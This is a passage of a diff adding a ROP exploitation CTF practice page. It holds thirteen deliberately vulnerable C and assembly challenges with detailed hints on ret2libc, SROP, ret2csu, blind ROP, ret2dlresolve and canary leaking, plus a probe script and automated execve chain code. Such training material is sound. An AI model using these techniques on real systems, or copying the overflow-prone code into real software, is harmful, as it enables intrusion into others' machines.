+    char opinion[72];
+    puts("Leave feedback:");
+    gets(opinion);
+    puts("Thanks!");
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    feedback();
+    return 0;
+}</code></pre>
+              </div>
+              <button class="hint-toggle">Show Hint</button>
+              <div class="hint-content">
+                <p>Classic two-stage ret2libc: Stage 1 → pop rdi + GOT[puts] + plt[puts] + main (leak libc). Parse the 6-byte leak. Stage 2 → ret + pop rdi + libc "/bin/sh" + libc system. Use <code>libc-database</code> or <code>patchelf</code> to match the libc version from the leak.</p>
+              </div>
+            </div>
+
+            <div class="ctf-card">
+              <h4>Challenge 3: SROP Shell</h4>
+              <span class="difficulty difficulty-hard">Hard</span>
+              <p class="objective">Minimal binary with only read, a syscall gadget, and a tiny overflow. Use SIGROP to get a shell.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// srop.c - compile as a minimal static binary
+// gcc -o srop srop.c -static -nostdlib -no-pie
+// Or write in pure assembly for maximum minimalism:
+
+/*
+_start:
+    xor rax, rax        ; read(0, rsp, 0x400)
+    xor rdi, rdi
+    mov rsi, rsp
+    mov rdx, 0x400
+    syscall
+    ret
+
+section .data
+    binsh: db "/bin/sh", 0
+*/</code></pre>
+              </div>
+              <button class="hint-toggle">Show Hint</button>
+              <div class="hint-content">
+                <p>Use pwntools <code>SigreturnFrame()</code>. Set RAX=15 (sigreturn), trigger syscall. The sigreturn frame sets all registers: RAX=59(execve), RDI=addr_of_binsh, RSI=0, RDX=0, RIP=syscall_addr. Write "/bin/sh" somewhere known (on the stack via the read) and reference it.</p>
+              </div>
+            </div>
+
+            <div class="ctf-card">
+              <h4>Challenge 4: Triple Threat</h4>
+              <span class="difficulty difficulty-medium">Medium</span>
+              <p class="objective">Call a function that requires three arguments. The binary has very few gadgets — no <code>pop rdx; ret</code>.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// ropctf4.c - gcc -o ropctf4 ropctf4.c -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void vault(long key1, long key2, long key3) {
+    if (key1 == 0xaa &amp;&amp; key2 == 0xbb &amp;&amp; key3 == 0xcc) {
+        system("cat flag.txt");
+    }
+}
+
+int main() {
+    char buf[56];
+    setbuf(stdout, NULL);
+    printf("keys> ");
+    gets(buf);
+    return 0;
+}</code></pre>
+              </div>
+              <button class="hint-toggle">Show Hint</button>
+              <div class="hint-content">
+                <p>No <code>pop rdx; ret</code> in a small binary? Use <code>__libc_csu_init</code> gadgets: the pop gadget loads r12-r15, and the call gadget moves r14→rdx, r13→rsi, r12d→edi. Set rbx=0, rbp=1, and r15 to a pointer to vault (use its GOT entry or a pointer in .data). After the call gadget, 7 values are popped before the next ret.</p>
+              </div>
+            </div>
+
+            <div class="ctf-card">
+              <h4>Challenge 5: CSU or Bust</h4>
+              <span class="difficulty difficulty-hard">Hard</span>
+              <p class="objective">The binary has no useful PLT entries and no libc. Use ret2csu to call write() via syscall and leak data, then call execve.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// ropctf5.c - gcc -o ropctf5 ropctf5.c -static -fno-stack-protector -no-pie
+#include &lt;unistd.h&gt;
+
+void vuln() {
+    char buf[80];
+    read(0, buf, 0x200);
+}
+
+int main() {
+    const char msg[] = "Go:\n";
+    write(1, msg, 4);
+    vuln();
+    return 0;
+}</code></pre>
+              </div>
+              <button class="hint-toggle">Show Hint</button>
+              <div class="hint-content">
+                <p>In a static binary, <code>__libc_csu_init</code> still exists. Use it to control RDX (third arg) for the write syscall: set r14=count, r13=buf_addr, r12d=fd. For the call target (r15+rbx*8), point to a location that holds the address of a <code>ret</code> gadget (or the function you want). Chain: write(1, got_entry, 8) to verify, then build an execve chain using available pop gadgets.</p>
+              </div>
+            </div>
+
+            <div class="ctf-card">
+              <h4>Challenge 6: Blind ROP</h4>
+              <span class="difficulty difficulty-hard">Hard</span>
+              <p class="objective">No binary provided. The remote service has a buffer overflow. Discover gadgets and exploit it blind (BROP attack).</p>
+              <div class="setup-code">
+<pre><code class="language-python"># The remote service:
+# - Forks on each connection (same memory layout)
+# - Has a stack overflow in a read() call
+# - Crashes if return address is wrong, hangs/prints if correct
+#
+# BROP Attack Steps:
+# 1. Find overflow offset (try lengths until crash)
+# 2. Probe for "stop gadgets" (addresses that don't crash)
+# 3. Find PLT entries by scanning for PLT stub patterns
+# 4. Find pop rdi; ret by probing __libc_csu_init offset
+# 5. Use puts@plt to dump the binary from memory
+# 6. With the dumped binary, do a normal ret2libc
+
+from pwn import *
+
+def probe(addr):
+    """Test if jumping to addr crashes or returns"""
+    r = remote('challenge', 9001)
+    payload = b'A' * offset + p64(addr) + p64(stop_gadget)
+    r.send(payload)
+    try:
+        r.recv(timeout=1)
+        return True  # didn't crash
+    except:
+        return False</code></pre>
+              </div>
+              <button class="hint-toggle">Show Hint</button>
+              <div class="hint-content">
+                <p>Key insight: if the server forks, the address space is identical each time. Scan for stop gadgets (addresses that cause the program to output something rather than crash). Then find the PLT: it has a regular stride (0x10 bytes). Once you find puts@plt and pop rdi, you can dump the binary from memory. Use <code>write(1, addr, len)</code> or <code>puts(addr)</code> to dump GOT, then pivot to ret2libc.</p>
+              </div>
+            </div>
+
+            <div class="ctf-card">
+              <h4>Challenge 7: Sigreturn Sandbox</h4>
+              <span class="difficulty difficulty-hard">Hard</span>
+              <p class="objective">A sandboxed binary blocks execve via seccomp. Use SROP to call open/read/write and exfiltrate the flag.</p>
+              <div class="setup-code">
+<pre><code class="language-nasm">; ropctf7.asm
+; seccomp filter: blocks execve (59), allows open/read/write
+section .text
+global _start
+_start:
+    ; install seccomp filter (blocks execve)
+    ; ... (seccomp setup omitted) ...
+
+    ; read(0, rsp, 0x800)
+    xor eax, eax
+    xor edi, edi
+    mov rsi, rsp
+    mov edx, 0x800
+    syscall
+    ret
+
+section .data
+    flag_path db "flag.txt", 0</code></pre>
+              </div>
+              <button class="hint-toggle">Show Hint</button>
+              <div class="hint-content">
+                <p>Chain three SigreturnFrames: Frame 1: <code>open("flag.txt", O_RDONLY)</code> → RSP points to frame2 trigger. Frame 2: <code>read(fd, bss_buf, 0x100)</code> (fd is the return value from open, usually 3). Frame 3: <code>write(1, bss_buf, 0x100)</code>. Set each frame's RSP to point to the next <code>pop rax; 15; syscall</code> sequence + next frame.</p>
+              </div>
+            </div>
+
+            <div class="ctf-card">
+              <h4>Challenge 8: Gadget Scarcity</h4>
+              <span class="difficulty difficulty-medium">Medium</span>
+              <p class="objective">A small dynamically linked binary with almost no useful gadgets. Get a shell using only what's available.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// ropctf8.c - gcc -o ropctf8 ropctf8.c -fno-stack-protector -no-pie -s
+#include &lt;stdio.h&gt;
+
+int main() {
+    char buf[32];
+    setbuf(stdout, NULL);
+    printf("scarce> ");
+    read(0, buf, 0x100);
+    return 0;
+}
+// Available gadgets (after stripping):
+//   pop rdi; ret       ← only this one
+//   ret
+// No pop rsi, no pop rdx, no syscall</code></pre>
+              </div>
+              <button class="hint-toggle">Show Hint</button>
+              <div class="hint-content">
+                <p>With only <code>pop rdi; ret</code>, you can still call one-arg functions. Use <code>puts@plt(GOT[puts])</code> to leak libc. After the leak, return to main. In stage 2, use a <strong>one_gadget</strong> from libc — these are addresses in libc that spawn a shell with zero or minimal constraints. Run <code>one_gadget ./libc.so.6</code> to find them. Pick one where constraints are satisfied (e.g., [rsp+0x70] == NULL).</p>
+              </div>
+            </div>
+
+            <div class="ctf-card">
+              <h4>Challenge 9: PIE Leaker</h4>
+              <span class="difficulty difficulty-hard">Hard</span>
+              <p class="objective">PIE enabled. Leak a code pointer from the stack, compute the binary base, then chain to a libc leak and shell.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// ropctf9.c - gcc -o ropctf9 ropctf9.c -fno-stack-protector -pie
+#include &lt;stdio.h&gt;
+
+void vuln() {
+    char buf[48];
+    printf("pie> ");
+    int n = read(0, buf, 0x100);
+    buf[n] = '\0';
+    printf("Echo: %s\n", buf);  // format string? no, but printf stops at \0
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    vuln();
+    return 0;
+}</code></pre>
+              </div>
+              <button class="hint-toggle">Show Hint</button>
+              <div class="hint-content">
+                <p>Fill the buffer up to — but not overwriting — the saved RBP and return address. Since printf prints until null and the buffer is contiguous with the stack frame, you can leak the saved RBP (stack addr) and return address (PIE code addr). Parse the leak: <code>pie_base = leaked_ret_addr - known_offset</code>. Now you have the binary base and can use PLT/GOT for a libc leak. Second stage: ret2libc with known bases.</p>
+              </div>
+            </div>
+
+            <div class="ctf-card">
+              <h4>Challenge 10: dl-resolve Deception</h4>
+              <span class="difficulty difficulty-hard">Hard</span>
+              <p class="objective">No output functions (no puts, no printf after overflow). Use ret2dlresolve to call system without any leaks.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// ropctf10.c - gcc -m32 -o ropctf10 ropctf10.c -fno-stack-protector -no-pie
+#include &lt;unistd.h&gt;
+
+int main() {
+    char msg[] = "input:\n";
+    write(1, msg, 7);
+    char buf[64];
+    read(0, buf, 0x200);
+    return 0;
+}</code></pre>
+              </div>
+              <button class="hint-toggle">Show Hint</button>
+              <div class="hint-content">
+                <p>Use pwntools <code>Ret2dlresolvePayload</code>. The strategy: ROP to <code>read(0, bss, len)</code> to stage fake ELF structures (.rel.plt, .dynsym, .dynstr entries for "system") in .bss. Then call <code>plt_init</code> (PLT[0]) with a fake reloc_index that points to your forged entries. The dynamic linker resolves "system" and calls it with your argument. 32-bit is easier because the structures are simpler (Elf32_Rel, Elf32_Sym).</p>
+              </div>
+            </div>
+
+            <div class="ctf-card">
+              <h4>Challenge 11: Multi-Stage Madness</h4>
+              <span class="difficulty difficulty-hard">Hard</span>
+              <p class="objective">Three-stage exploit: leak canary, leak libc, then ROP to shell. Each stage returns to the vulnerable function.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// ropctf11.c - gcc -o ropctf11 ropctf11.c -no-pie
+// Note: stack canary IS enabled (default)
+#include &lt;stdio.h&gt;
+
+void vuln() {
+    char buf[40];
+    printf("msg> ");
+    read(0, buf, 0x100);
+    printf("Echo: %s\n", buf);
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    while(1) { vuln(); }
+    return 0;
+}</code></pre>
+              </div>
+              <button class="hint-toggle">Show Hint</button>
+              <div class="hint-content">
+                <p>Stage 1: Overwrite buf up to and including the canary's null byte (buf[40] = canary starts here, first byte is \x00). The printf leak reveals the canary's remaining 7 bytes. Stage 2: Now that you know the canary, overflow past it and overwrite the return address with a puts@plt(GOT[puts]) + vuln chain to leak libc. Stage 3: Full ret2libc with the known canary and libc base. Each stage returns to vuln() (the while loop helps).</p>
+              </div>
+            </div>
+
+            <div class="ctf-card">
+              <h4>Challenge 12: Static Siege</h4>
+              <span class="difficulty difficulty-medium">Medium</span>
+              <p class="objective">Statically linked binary with no libc to leak. Build a pure syscall ROP chain to read the flag file.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// ropctf12.c - gcc -o ropctf12 ropctf12.c -static -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+
+int main() {
+    char buf[96];
+    printf("static> ");
+    read(0, buf, 0x400);
+    return 0;
+}</code></pre>
+              </div>
+              <button class="hint-toggle">Show Hint</button>
+              <div class="hint-content">
+                <p>In a static binary, you have thousands of gadgets. Chain: (1) Write "flag.txt\0" to .bss using <code>pop rdi; pop rsi; mov [rdi], rsi</code>. (2) <code>open(bss, 0)</code> via syscall 2. (3) <code>read(3, bss+0x100, 0x100)</code> via syscall 0 (fd=3 is the opened file). (4) <code>write(1, bss+0x100, 0x100)</code> via syscall 1. Use <code>ROPgadget --binary ropctf12 --ropchain</code> as a starting point, then modify for open/read/write instead of execve.</p>
+              </div>
+            </div>
+
+            <div class="ctf-card">
+              <h4>Challenge 13: AutoROP Arena</h4>
+              <span class="difficulty difficulty-easy">Easy</span>
+              <p class="objective">Solve a static binary challenge using only automated ROP tools — no manual gadget hunting allowed.</p>
+              <div class="setup-code">
+<pre><code class="language-c">// ropctf13.c - gcc -o ropctf13 ropctf13.c -static -fno-stack-protector -no-pie
+#include &lt;stdio.h&gt;
+
+void vuln() {
+    char buf[128];
+    printf("auto> ");
+    gets(buf);
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    vuln();
+    return 0;
+}</code></pre>
+              </div>
+              <button class="hint-toggle">Show Hint</button>
+              <div class="hint-content">
+                <p>Three approaches — try all three and compare output:</p>
+<pre><code class="language-bash"># 1. ROPgadget
+ROPgadget --binary ropctf13 --ropchain &gt; chain.py
+# Edit chain.py: add padding, adjust offset, send via pwntools
+
+# 2. pwntools ROP
+rop = ROP(elf)
+rop.execve(next(elf.search(b'/bin/sh')), 0, 0)
+payload = fit({offset: rop.chain()})
+
+# 3. angrop (angr's ROP compiler)
+import angr, angrop
+p = angr.Project('./ropctf13')
+rop = p.analyses.ROP()
+rop.find_gadgets()
+chain = rop.execve()</code></pre>
+              </div>
+            </div>
+          </div>
+        </div>
     </div> 
 </body>
 </html>
